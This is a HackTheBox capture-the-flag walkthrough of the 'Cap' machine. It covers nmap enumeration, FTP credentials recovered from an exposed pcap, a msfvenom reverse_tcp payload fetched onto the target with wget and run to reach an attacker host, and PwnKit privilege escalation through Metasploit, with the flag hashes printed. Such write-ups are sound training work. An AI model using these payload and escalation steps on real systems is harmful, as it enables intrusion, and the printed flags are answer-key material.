---
title: Cap - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---
# Cap - A HackTheBox  machine

## user.txt

We enumerate the target:

```
sudo nmap -sC -sV $ip --top-ports 10000
```

Open ports: 21, 22 and 80.

We access the IP via browser and we can see a Gunicorn service, that allows you to capture the traffic with the server and the download of the pcap files.  By enumerating these pcap files, we note that the first capture we did was under id 1. So we enumerate even previous pcap files. We find one at:

```
http://10.129.49.200/download/0
```

In this pcap file we can spot a successful login into the FTP service with creds:

```
nathan:Buck3tH4TF0RM3!
```

Now we login an retrieve the user.txt file:

```
ftp nathan@$ip
# Enter password when prompted.
dir
get user.txt
quit
cat user.txt
```

Results: b1200746cf3fc6fcb47503517d1fcad3


## root.txt

We do some basic recon. We note the outcome for this:

```
uname -a 
```

Output:

```
Linux cap 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```


We will use the exploit suggester:

```
https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
```

The outcome:

```
Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[CUT for brevity]
```

As the first exploit is newer than the machine we will go for the second. 

For exploiting it, we need a session using Metasploit and a exploit/multi/handler.

First we create the msfvenom file from our attacker machine:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.154 LPORT=1234 -f elf > shell.elf
```

We copy this file to the target host:

```
# From our kali
python3 -m http.server 80

# From the target host 
wget http://$kaliAttackingIP/shell.elf
chmod +x shell.elf
```

We establish a session from metasploit:

```
# From the kali attacking machine
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
setg LHOST 10.10.14.154
set LPORT 1234
exploit -j

# From the target host:
./shell.elf

# And we will obtain a session with the privileges of the user nathan.
```

Now we will escalate privileges. From the attacker machine, using metasploit:

```
# Check out the open sessions:
sessions

# Use the module 
search CVE-2021-4034
use 0
set SESSION 1
run
```

As a result we will obtain a meterpreter terminal:

```
cat /root/root.txt
```

Results: 66dd8fcc46c115693d1c5ae789a11a8d